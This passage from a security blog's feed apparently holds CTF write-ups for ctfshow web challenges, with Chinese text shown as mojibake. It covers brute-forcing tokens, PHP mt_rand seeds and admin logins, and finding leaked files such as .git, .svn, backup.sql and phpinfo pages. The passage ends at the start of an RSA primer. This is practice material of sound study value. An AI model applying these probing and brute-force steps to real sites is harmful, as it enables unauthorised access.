&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">rep =requests.get(url,headers=header)</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line"><span class="built_in">print</span>(rep.text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><blockquote><p>åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå</p></blockquote><p>ç›´æ¥æ‹¿ç€Layerå¼€æ‰«ï¼Œç»“æœæ‰«äº†åŠå¤©æ²¡çœ‹è§flagç›¸å…³çš„ä¿¡æ¯ï¼Œçœ‹äº†hintï¼Œè®¿é—®äº†ä¸€ä¸‹flag.ctf.showæŒ‚äº†ï¼Œäº¤äº†flagè·‘è·¯ã€‚</p><p><img src="https://img-blog.csdnimg.cn/3a06bc7471cb4bddbfb3397e36d88733.png" alt="img"></p><h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><blockquote><p>è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ¬¡å¾—å†™ä¸ªpythonäº†ï¼Œè·‘ä¸€ä¸‹md5åtokençš„å€¼</p><p>è·‘é•¿åº¦ä¸ºäºŒåº”è¯¥å°±è¡Œï¼Œå†™ä¸¤é‡forå¾ªç¯ï¼Œä¹Ÿæ˜¯åªåˆ¤æ–­ä¸€ä¸ªæ¡ä»¶å°±å¯ï¼Œè·‘å‡ºæ¥å¤šä¸ªå€¼æœ€å3jå¯ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">dic = &#x27;0123456789qazwsxedcrfvtgbyhnujmikolp&#x27;</span><br><span class="line">md5 = hashlib.md5(dic.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class="line">for a in dic:</span><br><span class="line">    for b in dic:</span><br><span class="line">        t = str(a)+str(b)</span><br><span class="line">        md5 = hashlib.md5(t.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class="line">        if md5[1:2] == md5[14:15] and md5[14:15]== md5[17:18]:</span><br><span class="line">            print(t)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><blockquote><p>çˆ†ä¸ªğŸ”¨</p></blockquote><p><img src="https://img-blog.csdnimg.cn/fc638926f8ae4c8284cf4025192acc7c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>mt_srand()æ˜¯æ ¹æ®ç§å­äº§ç”Ÿéšæœºæ•°çš„éšæœºå‡½æ•°ï¼Œå†æœ¬åœ°éƒ¨ç½²ä¸€ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/5fa348e580514ac292cb1c52e94f06dc.png" alt="img"></p><p>å‘ç°ç«Ÿç„¶å’Œphpç‰ˆæœ¬æœ‰å…³ç³»</p><p><img src="https://img-blog.csdnimg.cn/9369384099314dd8be5e9d3c31be4d7f.png" alt="img"></p><p>ä¼ å‚æ‹¿åˆ°flag</p><h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><blockquote><p>çˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹å¤æ‚</p><p>æ ¹æ®ä¸‹é¢è¿™æ¡è¯­å¥ï¼Œå°†r=0æŸ¥çœ‹ç¬¬ä¸€æ¬¡mt_rand()å€¼çš„å¤§å°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rand = intval($r)-intval(mt_rand());</span><br></pre></td></tr></table></figure><p>è·å¾—å€¼1437571926(æ¯æ¬¡éƒ½ä¸ä¸€æ ·ï¼‰ï¼Œç™¾åº¦mt_rand()å‘ç°å¯ä»¥å€’æ¨ï¼Œç„¶åæè„šæœ¬</p><p><img src="https://img-blog.csdnimg.cn/45691245894e42f387a87abd0a798289.png" alt="img"></p><p>è§£å‡ºäº†ç§å­379528259</p><p>æˆåŠŸè§£å‡ºä¸¤ä¸ªçš„å€¼</p><p>1437571926<br>3521708304</p><p>æå®šï¼Œæ–°çŸ¥è¯†get</p><h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><blockquote><p>è¿™ä¸ªå¯ä»¥çˆ†</p></blockquote><p><img src="https://img-blog.csdnimg.cn/bd7e444d6d1543b483824a76c9cc8ab9.png" alt="img"></p><p>åº”è¯¥æ˜¯ç›´æ¥çˆ†ä»–æ•°æ®åº“å¼€æ•´ï¼Œbpå¯åŠ¨</p><p>çˆ†ç ´å‡ºå¯†ç 7758521</p><h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><blockquote><p>CTFshowèœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼</p></blockquote><p><img src="https://img-blog.csdnimg.cn/05db4f87f238445296df23de920245f6.png" alt="img"></p><p>æƒ³èµ·æ¥ä¸€äº›ä¸å¥½çš„äº‹æƒ…ï¼Œç‚¹å‡»å½•å–åå•</p><p><img src="https://img-blog.csdnimg.cn/706638a78b1842c5a74760f905d4001d.png" alt="img"></p><p>ç›´æ¥å»æŸ¥è¯¢ç³»ç»Ÿçˆ†ç ´</p><p><img src="https://img-blog.csdnimg.cn/3577f0e1135849f385ba7b1e867f9aa8.png" alt="img"></p><p>æ‹¿ä¸‹è§£ç </p><p><img src="https://img-blog.csdnimg.cn/ae13ae15863c4ab48e9db0e8ff91f765.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/e35d963859dc45c8b06a225ba6c3877f.png" alt="img"></p><h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><blockquote><p>å¤§æµ·æé’ˆ</p></blockquote><p>æ˜æ˜¾çš„ç›®å½•éå†ï¼Œç›´æ¥ç”¨bpè‡ªå¸¦çš„ç›®å½•éå†åŠŸèƒ½å‘ç°å¥½åƒä¸å¤ªè¡Œ</p><p>åˆšæ‰æ–‡ä»¶çš„ç»“æ„çˆ†ç ´0/0-100è¯•è¯•ä¸è¡Œ</p><p>ç„¶åçˆ†ç ´0-100/0-100</p><p><img src="https://img-blog.csdnimg.cn/b4da789abf004ca096e2be50336e3ecc.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshowçˆ†ç ´&quot;&gt;&lt;a href=&quot;#ctfshowçˆ†ç ´&quot; class=&quot;headerlink&quot; title=&quot;ctfshowçˆ†ç ´&quot;&gt;&lt;/a&gt;ctfshowçˆ†ç ´&lt;/h1&gt;&lt;p&gt;å¼€å§‹ç©&lt;/p&gt;
&lt;h2 id=&quot;web21&quot;&gt;&lt;a href=&quot;#web21&quot; cl</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†</title>
    <link href="http://websec.space/2022/01/25/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://websec.space/2022/01/25/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2022-01-24T16:00:00.000Z</published>
    <updated>2022-01-25T03:43:40.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†"><a href="#webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†" class="headerlink" title="webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†"></a>webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote><p>å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤ </p></blockquote><p>ctr+uæˆ–è€…f12</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><blockquote><p>jså‰å°æ‹¦æˆª <em>=== æ— æ•ˆæ“ä½œ</em></p></blockquote><p>å‰ç«¯è¿‡æ»¤äº†f12</p><p>ctr+uæå®š</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><blockquote><p>æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p></blockquote><p>bpæŠ“åŒ…</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><blockquote><p>æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</p></blockquote><p>è®¿é—®robots.txt</p><p>å‘ç°æ–‡ä»¶flagishere.txtè®¿é—®å¾—åˆ°flag</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><blockquote><p>phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</p></blockquote><p>è®¿é—®index.phpså‘ç°æºç æ³„éœ²æ‰“å¼€å­˜åœ¨ã€‚</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><blockquote><p>è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p></blockquote><p>æºç æ³„éœ²ï¼Œé¦–å…ˆè®¿é—®<a href="http://www.zip/">www.zip</a></p><p>æˆåŠŸæ‹‰å–åˆ°æºç ï¼Œä½†æ˜¯ä¸æ­£ç¡®fl000g.txt</p><p>äºæ˜¯ç›´æ¥å†æµè§ˆå™¨è®¿é—®fl000g.txtæ‹¿åˆ°æºç </p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote><p>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p></blockquote><p>ç‰ˆæœ¬æ§åˆ¶å™¨é¦–å…ˆæƒ³åˆ°äº†gitæ³„éœ²</p><p>è¾“å…¥/.gitæ‹¿åˆ°flag</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><blockquote><p>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p></blockquote><p>ç‰ˆæœ¬æ§åˆ¶å™¨é™¤äº†/.gitå°±æ˜¯/.svn</p><p>æœç„¶flagåˆ°æ‰‹</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote><p>å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒ<strong>vim</strong>æ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</p></blockquote><p>vimä¸­é€”å¦‚æœå‡ºç°é—®é¢˜ä¼šå½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆ</p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><blockquote><p>cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</p></blockquote><p>æµè§ˆå™¨æŸ¥çœ‹cookieå‘ç°flag</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><blockquote><p>åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚<strong>ctfshow</strong>.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</p></blockquote><p>é€šè¿‡dnsæ£€æŸ¥æŸ¥è¯¢flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT è®°å½•ï¼Œä¸€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜ã€‚</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote><p>æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p></blockquote><p>æ ¹æ®æç¤ºå…ˆè®¿é—®/adminå‘ç°æœ‰ç™»å½•é¡µé¢</p><p><img src="https://img-blog.csdnimg.cn/8d88de8c6e8a40389b5df4a25786fb9c.png" alt="img" style="zoom: 80%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>å¯†ç æœªçŸ¥æ ¹æ®é¢˜ç›®ä¿¡æ¯å»é¡µé¢è§‚å¯Ÿ</p><img src="https://img-blog.csdnimg.cn/0ac70b8b570142f2959878e5edd69b9f.png" alt="img" style="zoom: 80%;" /><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><blockquote><p>æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p></blockquote><p>æ ¹æ®é¢˜ç›®æ¡ä»¶å»æ‰¾å®˜æ–¹æ–‡æ¡£</p><p>å‘ç°documentæœ‰å…¥å£ä»¥åŠå¯†ç æ‹¿åˆ°flag</p><img src="https://img-blog.csdnimg.cn/f3d21a26e4a649ae9fa8b2177f632d1d.png" alt="img" style="zoom:50%;" /><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote><p>æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦*(editor)*çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</p></blockquote><p><img src="https://img-blog.csdnimg.cn/4d5b7df3146348a88d36ef0ea23f84b2.png" alt="img"></p><p>editorä¿¡æ¯ä¸­ï¼Œç„¶åå‘ç°ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹å¯ä»¥ç›´æ¥</p><img src="https://img-blog.csdnimg.cn/27b013d770694798bc115b9176000986.png" alt="img" style="zoom: 80%;" /><p>é‚£è¿™å¯å¤ªç¦»è°±äº†ã€‚</p><img src="https://img-blog.csdnimg.cn/f022f0a426ba450fbbcbfad53331ba7a.png" alt="img" style="zoom: 80%;" /><p>è®¿é—®/nothinghere/fl000g.txtæ‹¿ä¸‹</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote><p>å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</p></blockquote><img src="C:\Users\97085\AppData\Roaming\Typora\typora-user-images\image-20220124191527791.png" alt="image-20220124191527791" style="zoom: 80%;" /><p>è®¿é—®/adminç‚¹å‡»å¿˜è®°å¯†ç æ ¹æ®é¢˜ç›®æ¡ä»¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªqqé‚®ç®±</p><p><img src="https://img-blog.csdnimg.cn/983366f282f240d58703eadce7152deb.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æå®šï¼</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote><p>å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</p></blockquote><p>å‘ç°çŸ¥è¯†ç›²ç‚¹äº†ï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹</p><p>PHPæ¢é’ˆï¼šphpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚</p><p>è¯•ç€è®¿é—®äº†ä¸‹/tz.php</p><p><img src="https://img-blog.csdnimg.cn/5734280a4eab497488f34566ae79672f.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>çœ‹äº†çœ‹ï¼Œä¸çŸ¥é“flagåœ¨å“ªå°±ä¹ æƒ¯æ€§è®¿é—®äº†ä¸‹phpinfoæœç„¶</p><img src="https://img-blog.csdnimg.cn/395d312fa8714ed68ab8c02dc391751c.png" alt="img" style="zoom:50%;" /><p>**é¡ºä¾¿åæ§½ï¼Œè—å¾—å¥½æ·± **</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote><p>å¤‡ä»½çš„<strong>sql</strong>æ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</p></blockquote><p>æ²¡åšè¿‡ç±»ä¼¼çš„ç›´æ¥åç‰¢äº†ï¼Œæƒ³äº†åŠå¤©è¿˜æ˜¯çœ‹äº†æç¤º</p><p>è®¿é—®backup.sql</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote><p>ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</p></blockquote><p>åšè¿‡ç±»ä¼¼çš„å°±æ˜¯æŸ¥çœ‹jsæºä»£ç ï¼Œå‘ç°ä¸€ä¸²unicodeç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</span><br></pre></td></tr></table></figure><p>ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹</p><p>è®¿é—®110.php</p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><blockquote><p>å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</p></blockquote><p>æ”¾åœ¨å‰ç«¯æˆ‘åŸç§°ä¹‹ä¸ºå‚»å­ç¨‹åºå‘˜</p><img src="https://img-blog.csdnimg.cn/7b8b5ba769f142f4a526a9b00df1fa7f.png" alt="img" style="zoom: 80%;" /><p>ç›´æ¥çœ‹å‰ç«¯çš„ä»£ç ï¼Œå‘ç°è´¦æˆ·å¯†ç ã€‚</p><p>ä½†å¯†ç æ˜¯åŠ å¯†è¿‡çš„ä¸èƒ½é€šè¿‡å‰ç«¯ä¼ è¾“ï¼Œå¾—ç”¨bpï¼Œæˆ–è€…ç”¨hackbar</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><blockquote><p>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+<strong>access</strong>æ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p></blockquote><p>ç½‘ä¸Šç™¾åº¦ï¼Œç„¶åç›´æ¥è®¿é—®/db/db.mp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†&quot;&gt;&lt;a href=&quot;#webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†&quot; class=&quot;headerlink&quot; title=&quot;webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†&quot;&gt;&lt;/a&gt;webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†&lt;/h1&gt;&lt;h2 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;head</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CTF-RSA(ä¸€)</title>
    <link href="http://websec.space/2022/01/18/CTF-RSA/"/>
    <id>http://websec.space/2022/01/18/CTF-RSA/</id>
    <published>2022-01-17T16:00:00.000Z</published>
    <updated>2022-01-23T05:30:22.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-RSA-ä¸€"><a href="#CTF-RSA-ä¸€" class="headerlink" title="CTF-RSA(ä¸€)"></a>CTF-RSA(ä¸€)</h1><h2 id="RSAå‘å±•ç®€å²"><a href="#RSAå‘å±•ç®€å²" class="headerlink" title="RSAå‘å±•ç®€å²"></a>RSAå‘å±•ç®€å²</h2><p>1976å¹´ï¼Œ<strong>Diffieå’Œ Hellman</strong>å‘è¡¨äº†éå¯¹ç§°å¯†ç çš„å¥ åŸºæ€§çš„è®ºæ–‡â€”â€”ã€Š<strong>å¯†ç å­¦çš„æ–°æ–¹å‘</strong>ã€‹</p><p>1978å¹´ï¼Œéº»çœç†å·¥å­¦é™¢çš„Rivestã€Shamirå’ŒAdlemanæå‡ºçš„RSAç®—æ³•</p><p>RSAå¯†ç ç®—æ³•åœ¨éå¯¹ç§°å¯†ç ç®—æ³•å‘å±•å²ä¸Šæœ‰ç€é‡è¦çš„åœ°ä½ï¼Œä¹Ÿæ˜¯è‡³ä»Šä¸ºæ­¢ç†è®ºä¸Šæœ€ä¸ºæˆç†Ÿå®Œå–„çš„å¯†é’¥å¯†ç ä½“åˆ¶ï¼Œè‡³ä»Šä»è¢«å¹¿æ³›åº”ç”¨ã€‚</p><h3 id="å¯†é’¥äº§ç”Ÿ"><a href="#å¯†é’¥äº§ç”Ÿ" class="headerlink" title="å¯†é’¥äº§ç”Ÿ"></a>å¯†é’¥äº§ç”Ÿ</h3><p>1.é€‰æ‹©ä¸¤ä¸ªæ»¡è¶³éœ€è¦çš„å¤§ç´ æ•°på’Œqï¼Œè®¡ç®—n=p*qï¼ŒÏ†(n)=(p-1) * (q-1) ,å…¶ä¸­Ï†(n)æ˜¯nçš„æ¬§æ‹‰å‡½æ•°ã€‚</p><p>2.é€‰ä¸€ä¸ªæ•´æ•°eï¼Œæ»¡è¶³1&lt;e&lt;Ï†(n),ä¸”gcd(Ï†(n),e)=1.é€šè¿‡d*eâ‰¡1mod Ï†(n)ï¼Œè®¡ç®—å‡ºdï¼ˆgcd()è¡¨ç¤ºæœ€å¤§å…¬å› æ•°ï¼‰</p><p>3.ä»¥{e,n}ä¸ºå…¬å¼€å¯†é’¥ï¼Œ{dï¼Œn}ä¸ºç§˜å¯†å¯†é’¥ã€‚å‡†ç¡®åœ°è¯´ç§˜å¯†å¯†é’¥å°±æ˜¯d</p><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>å¦‚æœå‘é€æ–¹æƒ³å‘é€éœ€è¦ä¿å¯†çš„æ¶ˆæ¯mç»™Aliceï¼Œå°±é€‰æ‹©Aliceçš„å…¬é’¥{eï¼Œn}ï¼Œç„¶åè®¡ç®—câ‰¡m<sup>e</sup> mod n ,ç„¶åæŠŠå¯†æ–‡cå‘é€ç»™æ¥æ”¶æ–¹Alice</p><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p>æ¥æ”¶æ–¹Aliceæ”¶åˆ°å¯†æ–‡cï¼Œæ ¹æ®è‡ªå·±æŒæ¡çš„ç§é’¥è®¡ç®—mâ‰¡c<sup>d</sup>mod nï¼Œæ‰€å¾—ç»“æœmå³ä¸ºå‘é€æ–¹æ¬²å‘é€çš„æ¶ˆæ¯</p><h3 id="RSAç®—æ³•çš„å®ç°"><a href="#RSAç®—æ³•çš„å®ç°" class="headerlink" title="RSAç®—æ³•çš„å®ç°"></a>RSAç®—æ³•çš„å®ç°</h3><p>åœ¨å®ç°RSAç®—æ³•æ—¶ï¼Œåœ¨æé«˜æŒ‡æ•°è¿ç®—é€Ÿåº¦ä¸Šï¼Œå¯ä»¥é‡‡ç”¨æ¨¡é‡å¤å¹³æ–¹è®¡ç®—æ³•æˆ–è€…å¹³æ–¹ä¹˜ç®—æ³•</p><h2 id="RSAåŠ å¯†è¿‡ç¨‹ï¼ˆå‡ºé¢˜è„šæœ¬ï¼‰"><a href="#RSAåŠ 